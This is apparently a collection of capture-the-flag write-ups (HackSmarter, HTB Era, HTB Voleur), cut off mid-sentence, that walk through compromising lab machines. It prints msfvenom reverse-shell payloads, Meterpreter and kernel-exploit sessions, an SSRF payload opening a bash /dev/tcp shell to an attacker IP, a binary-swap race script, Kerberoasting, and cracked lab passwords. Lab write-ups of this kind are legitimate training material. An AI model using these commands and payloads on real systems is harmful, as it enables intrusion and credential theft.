(alice.wonderland)\n$krb5tgs$23$*alice.wonderland$HACK.SMARTER$hack.smarter/alice.wonderland*$c0877f710c4a3c59743ba96bd14a75e5$9e865d389a305516264f13644ba1e68dbb216e08e4cf70c31c0320aa53cd4bf2eef18b1c19ddfa3c71583eadb970a35eccdaec0a82c9537d45074af121cd13a1810824b0ff0be45dd8773176420b0055943ded1e96c1e7e4a716a9adfb9b8cb0aed78f8350a0fa2c162c3ca3b6ef6f59ed0236ad215b698bcf55bc84996d9893c7b4d533629ff3d42ea682a63864f9f677a6b4c021bdbe61895bb0296066401bf0b01a354d2b0e1f5b06ec64659c8425c1edd67ef4b1f764eca1af2fec2401002d46f0ef9580d36707f343fa9e3<SNIP>\n```\nWe can try to crack, if it's a weak password, perhaps if it doesn't crack we could then resort to changing the password.\n\n# Getting a foot in the door\n\n![](/img/tom-and-jerry-mafia.gif)\n\nSo starting off not too strong. No privileges for us to use.\n\n```\nkonoha# evil-winrm -i dc01.hack.smarter -u alice.wonderland -p 'P@ssw0rd'\n\nEvil-WinRM shell v3.7\n\nWarning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline\n\nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n\nInfo: Establishing connection to remote endpoint\n/var/lib/gems/3.3.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...\n*Evil-WinRM* PS C:\\Users\\alice.wonderland\\Documents> whoami /priv\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                    State\n============================= ============================== =======\nSeMachineAccountPrivilege     Add workstations to domain     Enabled\nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set Enabled\n```\nChecking the OS, we have Windows Server 2022 Standard.\n```\n*Evil-WinRM* PS C:\\Users\\alice.wonderland\\Documents> Get-ComputerInfo\n\n\nWindowsBuildLabEx                                       : 20348.1.amd64fre.fe_release.210507-1500\nWindowsCurrentVersion                                   : 6.3\nWindowsEditionId                                        : ServerStandard\nWindowsInstallationType                                 : Server\nWindowsInstallDateFromRegistry                          : 9/2/2025 9:09:11 PM\nWindowsProductId                                        : 00454-10000-00001-AA349\nWindowsProductName                                      : Windows Server 2022 Standard\n```\n\nFor PrivEsc we can use Metasploit since it's well equipped with an armory.\n\n# PrivEsc\n\n![](/img/beans.gif)\n\nSo we can create a shell with *msfvenom* and continue from there.\n\n```\nkonoha# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=32002 -f exe > pga.exe\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 510 bytes\nFinal size of exe file: 7680 bytes\n```\nThen setup our listener on msfconsole\n```\nmsf exploit(windows/local/cve_2024_35250_ks_driver) > use exploit/multi/handler\n[*] Using configured payload windows/x64/meterpreter/reverse_tcp\nmsf exploit(multi/handler) >\nmsf exploit(multi/handler) > options\n\nPayload options (windows/x64/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)\n   LHOST     tun0             yes       The listen address (an interface may be specified)\n   LPORT     32002            yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Wildcard Target\n\n\n\nView the full module info with the info, or info -d command.\n\nmsf exploit(multi/handler) > run -j\n[*] Exploit running as background job 2.\n[*] Exploit completed, but no session was created.\n\n[*] Started reverse TCP handler on 10.200.21.53:32002\n```\n\nFinally, we can upload and execute.\n\n```\n*Evil-WinRM* PS C:\\Users\\alice.wonderland\\Documents> upload pga.exe\n*Evil-WinRM* PS C:\\Users\\alice.wonderland\\Documents> start pga.exe\n```\n\nAnd back on our machine.\n```\nmsf exploit(multi/handler) >\n[*] Sending stage (230982 bytes) to 10.0.21.159\n[*] Meterpreter session 5 opened (10.200.21.53:32002 -> 10.0.21.159:54023) at 2025-11-23 18:57:41 -0600\n\nmsf exploit(multi/handler) > sessions -i 5\n[*] Starting interaction with 5...\n\nmeterpreter > getuid\nServer username: HACK\\alice.wonderland\n```\n\n## I bet you already knew about this ðŸ˜\n\nLooking for juciy vulnerabilities.\n\n```\nmeterpreter > run post/multi/recon/local_exploit_suggester\n[*] 10.0.21.159 - Collecting local exploits for x64/windows...\n[*] Collecting exploit 751 / 2568\n```\n\nAfter this gave back output, we find that there are many we can try. This [kernel exploit](https://www.rapid7.com/db/modules/exploit/windows/local/cve_2024_35250_ks_driver/) worked just perfectly.\n```\nmsf exploit(windows/local/cve_2024_35250_ks_driver) > run\n[*] Started reverse TCP handler on 10.200.21.53:4444\n[*] Running automatic check (\"set AutoCheck false\" to disable)\n[+] The target appears to be vulnerable. ks.sys is present, Windows Version detected: Windows Server 2022\n[*] Launching notepad to host the exploit...\n[*] The notepad path is: C:\\Windows\\System32\\notepad.exe\n[*] The notepad pid is: 6704\n[*] Reflectively injecting the DLL into 6704...\n[*] Sending stage (230982 bytes) to 10.0.21.159\n[*] Meterpreter session 4 opened (10.200.21.53:4444 -> 10.0.21.159:51034) at 2025-11-23 16:09:08 -0600\n\nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM\n```\n\n![](/img/robocop.gif)","tags":["SMB","GenericAll","ntlmtheft","Windows Kernel LPE"],"categories":["hacksmarter"]},{"title":"Era (Linux Hard)","url":"/2025/07/27/Era/","content":"\n![](/img/era.png)\n\nThis is a linux hard box focusing on SSRF which you can use in turn to trigger ssh2.exec. This executes on the box giving a reverse shell. On the box we escalate to eric with previously cracked hash. Using pspy, we find a binary running via cronjob. The binary `objcopy` is used to check a file, with in turn we replace with our malicious binary that upon execution gets us a shell as root. \n\n## Initial Nmap\n```bash\nPORT   STATE SERVICE REASON         VERSION\n21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.5\n80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)\n| http-methods:\n|_  Supported Methods: GET HEAD POST OPTIONS\n|_http-server-header: nginx/1.18.0 (Ubuntu)\n|_http-title: Did not follow redirect to http://era.htb/\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n```\n\n## FTP for smiles\n\nLooking at FTP and trying anonymous logon get us nothing. Moving on.\n\n## HTTP\n\nScanning this site gives us the domain name `era.htb` we can add to our hosts file. Looking at the site nothing special.\n\n![](/img/eraweb.png)\n\nWe can scan for subdomains, which we get a hit on `file`.\n```bash\nkonoha# ffuf -u http://era.htb -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H 'Host: FUZZ.era.htb' -fl 8\n<\n        /'___\\  /'___\\           /'___\\\n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/\n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\\n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/\n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\\n          \\/_/    \\/_/   \\/___/    \\/_/\n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://era.htb\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt\n :: Header           : Host: FUZZ.era.htb\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n :: Filter           : Response lines: 8\n________________________________________________>\n\nfile                    [Status: 200, Size: 6765, Words: 2608, Lines: 234, Duration: 42ms]\n```\n\nAfter adding it to our hosts file we can visit.\n\n![](/img/eraweb1.png)\n\nFrom the looks its a storage management page were we can upload files. If we try *register.php* we get a page we can sign up.\n\n![](/img/eraweb2.png)\n\nOnce done we get redirected to a login page, looking around we see a upload files tab. Lets try this.\n\n![](/img/eraweb3.png)\n\nOnce we upload our file we get a link returned.\n\n![](/img/eraweb4.png)\n\nWe should try fuzzing this as it reeks of IDOR(Insecure Direct Object Reference). We can send this to burpsuite, and try numbers from 1 to our id number (4672). We add the position, start the attack and look at our lengths. We can see off the bat, id number *54* has a different length. Looking at this reveals the site backup, which we download. \n\n![](/img/eraweb5.png)\n\n### Source Code for Downloading - Admin \nLooking into this zip file we see the *download.php* we just used. We can look at the source code to see how this works. Upon looking at it, we find this bit that works only for admins.\n```php\n\t// BETA (Currently only available to the admin) - Showcase file instead of downloading it\n\t} elseif ($_GET['show'] === \"true\" && $_SESSION['erauser'] === 1) {\n    \t\t$format = isset($_GET['format']) ? $_GET['format'] : '';\n    \t\t$file = $fetched[0];\n\n\t\tif (strpos($format, '://') !== false) {\n        \t\t$wrapper = $format;\n        \t\theader('Content-Type: application/octet-stream');\n    \t\t} else {\n        \t\t$wrapper = '';\n        \t\theader('Content-Type: text/html');\n    \t\t}\n\n    \t\ttry {\n        \t\t$file_content = fopen($wrapper ? $wrapper . $file : $file, 'r');\n\t\t\t$full_path = $wrapper ? $wrapper . $file : $file;\n\t\t\t// Debug Output\n\t\t\techo \"Opening: \" . $full_path . \"\\n\";\n        \t\techo $file_content;\n    \t\t} catch (Exception $e) {\n        \t\techo \"Error reading file: \" . $e->getMessage();\n    \t\t}\n\n```\n\nWe also have a *sqlite* database, which we can dump.\n\n```sql\nkonoha# sqlite3 filedb.sqlite '.dump'\nPRAGMA foreign_keys=OFF;\nBEGIN TRANSACTION;\nCREATE TABLE files (\n\t\tfileid int NOT NULL PRIMARY KEY,\n\t\tfilepath varchar(255) NOT NULL,\n\t\tfileowner int NOT NULL,\n\t\tfiledate timestamp NOT NULL\n\t\t);\nINSERT INTO files VALUES(54,'files/site-backup-30-08-24.zip',1,1725044282);\nCREATE TABLE users (\n\t\tuser_id INTEGER PRIMARY KEY AUTOINCREMENT,\n\t\tuser_name varchar(255) NOT NULL,\n\t\tuser_password varchar(255) NOT NULL,\n\t\tauto_delete_files_after int NOT NULL\n\t\t, security_answer1 varchar(255), security_answer2 varchar(255), security_answer3 varchar(255));\nINSERT INTO users VALUES(1,'admin_ef01cab31aa','$2y$10$wDbohsUaezf74d3sMNRPi.o93wDxJqphM2m0VVUp41If6WrYr.QPC',600,'Maria','Oliver','Ottawa');\nINSERT INTO users VALUES(2,'eric','$2y$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm',-1,NULL,NULL,NULL);\nINSERT INTO users VALUES(3,'veronica','$2y$10$xQmS7JL8UT4B3jAYK7jsNeZ4I.YqaFFnZNA/2GCxLveQ805kuQGOK',-1,NULL,NULL,NULL);\nINSERT INTO users VALUES(4,'yuri','$2b$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.',-1,NULL,NULL,NULL);\nINSERT INTO users VALUES(5,'john','$2a$10$iccCEz6.5.W2p7CSBOr3ReaOqyNmINMH1LaqeQaL22a1T1V/IddE6',-1,NULL,NULL,NULL);\nINSERT INTO users VALUES(6,'ethan','$2a$10$PkV/LAd07ftxVzBHhrpgcOwD3G1omX4Dk2Y56Tv9DpuUV/dh/a1wC',-1,NULL,NULL,NULL);\nDELETE FROM sqlite_sequence;\nINSERT INTO sqlite_sequence VALUES('users',16);\nCOMMIT;\n```\n\nPutting these into a file and attempting to crack with john the ripper.\n\n```\nkonoha# john --wordlist=/usr/share/seclists/Passwords/xato-net-10-million-passwords.txt hashes\nUsing default input encoding: UTF-8\nLoaded 6 password hashes with 6 different salts (bcrypt [Blowfish 32/64 X3])\nLoaded hashes with cost 1 (iteration count) varying from 1024 to 4096\nWill run 8 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nmustang          (yuri)\namerica          (eric)\n2g 0:00:00:23 0.02% (ETA: 2025-07-29 00:21) 0.08340g/s 54.04p/s 246.2c/s 246.2C/s moose..blahblah\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession aborted\n```\n\n### Security Questions\n\nWe saw a update security questions tab, since we have usernames lets try to reset the admin password. \n![](/img/eraweb6.png)\n\nAfter doing so we get this response.\n![](/img/eraweb7.png)\n\nLets try to sign in as the admin now. Instead of using a password we can use the security questions we just updated.\n[](/img/eraweb8.png)\n\nAfter filling these in, we can login. Once the verify and login button is pressed we are redirected to our file storage dashboard.\n![](/img/eraweb9.png)\n\nOnce there we see the signing and site backup zip files. We knew about the site backup. We have the source code which if we rememeber we have a little piece we can try now that we're admin.\n![](/img/eraweb10.png)\n\n### Exploiting the flaw in a new Era ðŸ˜ƒðŸ¤£\n\nSo for this we are going to use the *show* parameter and the *format* parameter we saw from the *download.php*. Looking at the code if `://` is used it will treat whatever is passed as a wrapper. We can try to get a reverse shell using the *ssh2 library*. Cool trick if I might add, first we have the password for yuri and eric we can try either, I'll use yuri. \n\nFirst we can copy the link and then go to it in our web browser, meanwhile intercepting with burpsuite. Then send it to repeater and add this to the request.\n\n```\n/download.php?id=150&show=true&format=ssh2.exec://yuri:mustang@127.0.0.1:22/bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.7/9001+0>%261;'\n```\n\nThe URI starts with *ssh2.exec*, using the ssh library. Then we have \"*://yuri:mustang@127.0.0.1:22*\" this part is the connection via localhost on port 22(ssh). Then we add our command we want to run, this being the \"*/bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.7/9001+0>%261;'*\". Once ran we get a hang and a call back.\n\n![](/img/eraweb11.png)\n\n## Yuri-ka!!!! We did it!!!\n\nWe can start by looking at users on the box.\n```bash\nyuri@era:~$ cat /etc/passwd | grep sh$\ncat /etc/passwd | grep sh$\nroot:x:0:0:root:/root:/bin/bash\neric:x:1000:1000:eric:/home/eric:/bin/bash\nyuri:x:1001:1002::/home/yuri:/bin/sh\n```\n\nWe have eric, we can try to escalate to him with his password. \n```bash\nyuri@era:~$ su eric\nsu eric\nPassword: america\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")'\neric@era:/home/yuri$\n```\n![](/img/robocop2016.gif)\n\n## So Eric, now what??\n\nAfter switching to eric, we looked at typical empty dirs to find one not so empty. \n```bash\neric@era:/home/yuri$ cd /opt\ncd /opt\neric@era:/opt$ ls -lsa\nls -lsa\ntotal 12\n4 drwxrwxr-x  3 root root 4096 Jul 22 08:42 .\n4 drwxr-xr-x 20 root root 4096 Jul 22 08:41 ..\n4 drwxrwxr--  3 root devs 4096 Jul 22 08:42 AV\n```\n\nThis seems to be a AV binary of some sort, there's a *monitor* ELF file we don't have access to run, yet we are in the group who can modify it. \n```bash\neric@era:/opt/AV/periodic-checks$ ls -lsa\nls -lsa\ntotal 32\n 4 drwxrwxr-- 2 root devs  4096 Jul 28 19:55 .\n 4 drwxrwxr-- 3 root devs  4096 Jul 22 08:42 ..\n20 -rwxrw---- 1 root devs 16544 Jul 28 19:55 monitor\n 4 -rw-rw---- 1 root devs   205 Jul 28 19:55 status.log\neric@era:/opt/AV/periodic-checks$ id\nid\nuid=1000(eric) gid=1000(eric) groups=1000(eric),1001(devs)\n```\n## PrivEsc\n\nI wanted to look at other process running and maybe crons. I copied over *pspy64* to see any processes running in the background we might have missed.\n```bash\n2025/07/28 20:01:04 CMD: UID=0     PID=5038   | rm -f text_sig_section.bin\n2025/07/28 20:02:01 CMD: UID=0     PID=5045   | /usr/sbin/CRON -f -P\n2025/07/28 20:02:01 CMD: UID=0     PID=5046   |\n2025/07/28 20:02:01 CMD: UID=0     PID=5047   |\n2025/07/28 20:02:01 CMD: UID=0     PID=5048   | objcopy --dump-section .text_sig=text_sig_section.bin /opt/AV/periodic-checks/monitor\n2025/07/28 20:02:01 CMD: UID=0     PID=5049   | /bin/bash /root/initiate_monitoring.sh\n2025/07/28 20:02:01 CMD: UID=0     PID=5050   | /bin/bash /root/initiate_monitoring.sh\n2025/07/28 20:02:01 CMD: UID=0     PID=5051   | /bin/bash /root/initiate_monitoring.sh\n2025/07/28 20:02:01 CMD: UID=0     PID=5052   | /bin/bash /root/initiate_monitoring.sh\n2025/07/28 20:02:01 CMD: UID=0     PID=5053   |\n2025/07/28 20:02:01 CMD: UID=0     PID=5054   | /bin/bash /root/initiate_monitoring.sh\n2025/07/28 20:02:01 CMD: UID=0     PID=5055   | ???\n2025/07/28 20:02:01 CMD: UID=0     PID=5057   | /opt/AV/periodic-checks/monitor\n```\nOk, so we see that it runs *objcopy* to check *monitor*. When I was reseaching I came across a [article](https://www.wiz.io/vulnerability-database/cve/cve-2021-20197) talking about a race condition we could try to abuse. I came up with a very small script the will take my reverse shell binary I cooked up with *msfvenom* and the copy of *monitor* I made and continuously replace each other, hoping this will be enough to beat the race condition.\n```bash\n#!/bin/bash\n\nTARGET_FILE=\"/opt/AV/periodic-checks/monitor\"\n\nLEGIT_FILE=\"/tmp/monitor\"\nMAL_FILE=\"/tmp/lame\"\n\nwhile true; do\n    cp \"$MAL_FILE\" \"$TARGET_FILE\" 2>/dev/null\n    cp \"$LEGIT_FILE\" \"$TARGET_FILE\" 2>/dev/null\ndone\n```\nAfter getting a listener ready, we get a copy of *monitor* to `/tmp` and our malicous ELF binary over to the machine. \n```bash\neric@era:/tmp$ cp /opt/AV/periodic-checks/monitor .\neric@era:/tmp$ wget 10.10.14.7/lame\n--2025-07-28 20:40:02--  http://10.10.14.7/lame\nConnecting to 10.10.14.7:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 194 [application/octet-stream]\nSaving to: â€˜lameâ€™\n\nlame                100%[===================>]     194  --.-KB/s    in 0.003s\n\n2025-07-28 20:40:02 (73.4 KB/s) - â€˜lameâ€™ saved [194/194]\n\neric@era:/tmp$ wget 10.10.14.7/privCheck.sh\n--2025-07-28 20:40:20--  http://10.10.14.7/privCheck.sh\nConnecting to 10.10.14.7:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 222 [text/x-sh]\nSaving to: â€˜privCheck.shâ€™\n\nprivCheck.sh        100%[===================>]     222  --.-KB/s    in 0s\n\n2025-07-28 20:40:20 (24.4 MB/s) - â€˜privCheck.shâ€™ saved [222/222]\n\neric@era:/tmp$\n```\n*REVERSE SHELL*\n`msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=9001 -f elf > lame`\n\nAfter waiting a minute or two....or five ðŸ˜‘, we finally get a callback.\n\n```bash\nkonoha# rlwrap -cAr nc -lvnp 9001\nlistening on [any] 9001 ...\nconnect to [10.10.14.7] from (UNKNOWN) [10.10.11.79] 52422\nid\nuid=0(root) gid=0(root) groups=0(root)\n```\n\n![](/img/robocop.gif)","tags":["SSRF","TOCTOU"],"categories":["htb"]},{"title":"Voleur (Windows Medium)","url":"/2025/06/30/Voleur/","content":"\n![](/img/voleur.png)\n\nVoleur starts with credentials, but after a nmap you find NTLM is disabled. Using kerberos, we are able to get a bloodhound dump. Checking the shares reveals a *xlsx* file, we can convert it and crack it. Once done, we get access to a excel file with some users and passwords, one user has be deleted. Once on the box, we lateral move to ldap_svc, and find a user that has been deleted. Using powershell, we restore them and then get a shell using the password found from the *xlsx* file. Then we do to the next directory in the IT share, and find a archived users directory which hold DPAPI credentials. After obtaining the credentials, we find our user able to access a backup in the next directory that contains the SAM, SECURITY, and NTDS files used to dump the Administrator hash.\n\n*As is common in real life Windows pentests, you will start the Voleur box with credentials for the following account: ryan.naylor / HollowOct31Nyt*\n\n\n## Initial Nmap\n```\nPORT     STATE SERVICE       REASON          VERSION\n53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus\n88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-08-19 09:21:15Z)\n135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC\n139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn\n389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)\n445/tcp  open  microsoft-ds? syn-ack ttl 127\n464/tcp  open  kpasswd5?     syn-ack ttl 127\n593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  tcpwrapped    syn-ack ttl 127\n2222/tcp open  ssh           syn-ack ttl 127 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)\n| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC+vH6cIy1hEFJoRs8wB3O/XIIg4X5gPQ8XIFAiqJYvSE7viX8cyr2UsxRAt0kG2mfbNIYZ+80o9bpXJ/M2Nhv1VRi4jMtc+5boOttHY1CEteMGF6EF6jNIIjVb9F5QiMiNNJea1wRDQ2buXhRoI/KmNMp+EPmBGB7PKZ+hYpZavF0EKKTC8HEHvyYDS4CcYfR0pNwIfaxT57rSCAdcFBcOUxKWOiRBK1Rv8QBwxGBhpfFngayFj8ewOOJHaqct4OQ3JUicetvox6kG8si9r0GRigonJXm0VMi/aFvZpJwF40g7+oG2EVu/sGSR6d6t3ln5PNCgGXw95pgYR4x9fLpn/OwK6tugAjeZMla3Mybmn3dXUc5BKqVNHQCMIS6rlIfHZiF114xVGuD9q89atGxL0uTlBOuBizTaF53Z//yBlKSfvXxW4ShH6F8iE1U8aNY92gUejGclVtFCFszYBC2FvGXivcKWsuSLMny++ZkcE4X7tUBQ+CuqYYK/5TfxmIs=\n|   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA)\n| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMkGDGeRmex5q16ficLqbT7FFvQJxdJZsJ01vdVjKBXfMIC/oAcLPRUwu5yBZeQoOvWF8yIVDN/FJPeqjT9cgxg=\n|   256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519)\n|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILv295drVe3lopPEgZsjMzOVlk4qZZfFz1+EjXGebLCR\n3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)\n3269/tcp open  tcpwrapped    syn-ack ttl 127\n5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\nService Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel\n\nHost script results:\n| p2p-conficker:\n|   Checking for Conficker.C or higher...\n|   Check 1 (port 48495/tcp): CLEAN (Timeout)\n|   Check 2 (port 27736/tcp): CLEAN (Timeout)\n|   Check 3 (port 60782/udp): CLEAN (Timeout)\n|   Check 4 (port 36910/udp): CLEAN (Timeout)\n|_  0/4 checks are positive: Host is CLEAN or ports are blocked\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n| smb2-time:\n|   date: 2025-08-19T09:21:18\n|_  start_date: N/A\n|_clock-skew: 59m59s\n```\nSince this is a windows environment, we can start with the simple AD enumeration.\n\n## LDAP\nWith credentials, we can get a dump for bloodhound.\n```\nkonoha# bloodhound-python -d voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -ns 10.10.11.76 --zip -c Group,LocalAdmin,Session,Trusts,DCOM,RDP,PSRemote,LoggedOn,Container,ObjectProps,ACL --disable-autogc --dns-timeout 20 -dc DC.voleur.htb -k -no-pass\n```\nChecking the user descriptions for any juice details.\n```\nkonoha# nxc ldap DC.voleur.htb -u ryan.naylor -p 'HollowOct31Nyt' -k --use-kcache -M get-desc-users\nLDAP        DC.voleur.htb   389    DC               [*] None (name:DC) (domain:voleur.htb)\nLDAP        DC.voleur.htb   389    DC               [+] voleur.htb\\ryan.naylor from ccache\nGET-DESC... DC.voleur.htb   389    DC               [+] Found following users:\nGET-DESC... DC.voleur.htb   389    DC               User: Administrator description: Built-in account for administering the computer/domain\nGET-DESC... DC.voleur.htb   389    DC               User: Guest description: Built-in account for guest access to the computer/domain\nGET-DESC... DC.voleur.htb   389    DC               User: krbtgt description: Key Distribution Center Service Account\nGET-DESC... DC.voleur.htb   389    DC               User: ryan.naylor description: First-Line Support Technician\nGET-DESC... DC.voleur.htb   389    DC               User: marie.bryant description: First-Line Support Technician\nGET-DESC... DC.voleur.htb   389    DC               User: lacey.miller description: Second-Line Support Technician\nGET-DESC... DC.voleur.htb   389    DC               User: jeremy.combs description: Third-Line Support Technician\n```\nWell we have some groups, we can take a note of these and come back later.\n\n- Restore_Users\n- First-Line Support Technicians\n- FIrst-Line Technicians\n\n## SMB\n\nLet's check out what shares we have available to us.\n```\nkonoha# nxc smb DC.voleur.htb -u ryan.naylor -p 'HollowOct31Nyt' -k --shares\nSMB         DC.voleur.htb   445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)\nSMB         DC.voleur.htb   445    DC               [+] VOLEUR.HTB\\ryan.naylor from ccache\nSMB         DC.voleur.htb   445    DC               [*] Enumerated shares\nSMB         DC.voleur.htb   445    DC               Share           Permissions     Remark\nSMB         DC.voleur.htb   445    DC               -----           -----------     ------\nSMB         DC.voleur.htb   445    DC               ADMIN$                          Remote Admin\nSMB         DC.voleur.htb   445    DC               C$                              Default share\nSMB         DC.voleur.htb   445    DC               Finance\nSMB         DC.voleur.htb   445    DC               HR\nSMB         DC.voleur.htb   445    DC               IPC$            READ            Remote IPC\nSMB         DC.voleur.htb   445    DC               IT              READ\nSMB         DC.voleur.htb   445    DC               NETLOGON        READ            Logon server share\nSMB         DC.voleur.htb   445    DC               SYSVOL          READ            Logon server share\n```\nConnecting via SMB.\n```\nkonoha# impacket-smbclient 'voleur.htb/ryan.naylor@DC.voleur.htb' -k -no-pass -dc-ip 10.10.11.76\n<SNIP>\n# ls\ndrw-rw-rw-          0  Wed Jan 29 03:40:17 2025 .\ndrw-rw-rw-          0  Wed Jan 29 03:10:01 2025 ..\n-rw-rw-rw-      16896  Thu May 29 17:23:36 2025 Access_Review.xlsx\n# mget *\n```\nFrom the IT share got `Access_Review.xlsx`, we can convert it to a hash and try to crack.\n```\nkonoha# office2john Access_Review.xlsx > access.hash\nkonoha# john --wordlist=/usr/share/wordlists/rockyou.txt access.hash\nUsing default input encoding: UTF-8\nLoaded 1 password hash (Office, 2007/2010/2013 [SHA1 128/128 AVX 4x / SHA512 128/128 AVX 2x AES])\nCost 1 (MS Office version) is 2013 for all loaded hashes\nCost 2 (iteration count) is 100000 for all loaded hashes\nWill run 8 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\n<SNIP>        (Access_Review.xlsx)\n```\n\nAfter cracking and opening. We have passwords and a user that was deleted(Possibly can restore him).\n\nLooking at svc_ldap they has permission `WriteSPN` over svc_winrm. After setting with bloodyAD we can GetUserSPNs again for svc_winrm's hash.\n![](/img/voleur2.png)\n\n```\nkonoha# bloodyAD -v DEBUG -d voleur.htb -u svc_ldap  -k --dc-ip 10.10.11.76 --host DC.voleur.htb set object svc_winrm servicePrincipalName -v HOST/svc_winrm\n\nkonoha# impacket-GetUserSPNs -dc-ip 10.10.11.76 'voleur.htb/svc_ldap' -request-user svc_winrm -k -no-pass -outputfile svc_winrm\n```\n\nsvc_winrm password cracks and we get a TGT and WinRM on the box.\n\n## On Box\n\nAs svc_winrm, we need to use RunaCs.exe to give ourself a shell as svc_ldap. \n\n```\n*Evil-WinRM* PS C:\\programdata> .\\RCs.exe svc_ldap M1XyC9pW7qT5Vn powershell -r 10.10.14.2:443 -t 0\n[*] Warning: The logon for user 'svc_ldap' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.\n\n[+] Running in session 0 with process function CreateProcessWithLogonW()\n[+] Using Station\\Desktop: Service-0x0-2d33258$\\Default\n[+] Async process 'C:\\ProgramData\\ms.exe' with pid 2796 created in background.\n```\n\nAs svc_ldap, we need find DeletedObjects using powershell.\n\n```\nPS C:\\Windows\\system32> Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq \"user\"' -IncludeDeletedObjects -Properties objectSid, lastKnownParent, ObjectGUID | Select-Object Name, ObjectGUID, objectSid, lastKnownParent | Format-List\n\n\nName            : Todd Wolfe\n                  DEL:1c6b1deb-c372-4cbb-87b1-15031de169db\nObjectGUID      : 1c6b1deb-c372-4cbb-87b1-15031de169db\nobjectSid       : S-1-5-21-3927696377-1337352550-2781715495-1110\nlastKnownParent : OU=Second-Line Support Technicians,DC=voleur,DC=htb\n```\n\nThen restore this object(user).\n\n```\nPS C:\\Windows\\system32> Restore-ADObject -Identity 1c6b1deb-c372-4cbb-87b1-15031de169db -TargetPath \"OU=Second-Line Support Technicians,DC=voleur,DC=htb\"\n```\n\nWe can now get a shell as todd.wolfe same way as before.\n```\n*Evil-WinRM* PS C:\\programdata> .\\RCs.exe todd.wolfe NightT1meP1dg3on14 powershell -r 10.10.14.2:443 -t 0\n[*] Warning: The logon for user 'todd.wolfe' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.\n\n[+] Running in session 0 with process function CreateProcessWithLogonW()\n[+] Using Station\\Desktop: Service-0x0-e18972$\\Default\n[+] Async process 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe' with pid 5340 created in background.\n```\n\n## DPAPI AGAIN, Where in a home directory duh!!\n\nAfter getting a shell we look into the IT directory at the root which has First,Second,Third OUs. We can 